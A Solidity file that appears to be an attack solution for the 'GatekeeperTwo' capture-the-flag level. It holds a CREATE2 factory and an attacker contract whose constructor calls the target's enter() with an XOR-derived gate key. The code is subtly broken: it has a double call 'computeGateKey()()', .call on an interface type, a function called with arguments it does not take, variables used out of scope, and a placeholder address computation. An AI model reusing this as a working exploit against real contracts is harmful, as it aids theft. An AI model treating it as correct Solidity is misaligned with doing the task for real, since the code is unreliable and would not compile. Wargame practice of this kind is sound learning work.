pragma solidity ^0.8.0;

interface IGatekeeperTwo {
    function enter(bytes8 _gateKey) external returns (bool);
}

contract GatekeeperTwoFactory {
    address immutable public instance;

    constructor(address _instance) {
        instance = _instance;
    }

    function createAttacker(bytes32 salt) public {
        new GatekeeperTwoAttacker{salt: salt}(instance, salt);
    }
}

contract GatekeeperTwoAttacker {
    IGatekeeperTwo immutable public target;

    constructor(IGatekeeperTwo _target, bytes32 salt) {
        target = _target;
        (bool success, ) = _target.call(abi.encodeWithSelector(0x3e2fa3d2, computeGateKey()()));
        require(success, "Attack failed");
    }

    function computeGateKey() internal view returns (bytes8) {
        address self = findAddress(_target, salt);
        bytes32 hash = keccak256(abi.encodePacked(self));
        bytes8 hash8 = bytes8(hash);
        uint64 hashUint = uint64(hash8);
        return bytes8(hashUint ^ 0xFFFFFFFFFFFFFFFF);
    }

    function findAddress() internal view returns (address) {
        address deployer = address(this);
        // This is a placeholder for the complex computation
        // Normally, you'd calculate it based on the factory address and salt
        return deployer;
    }
}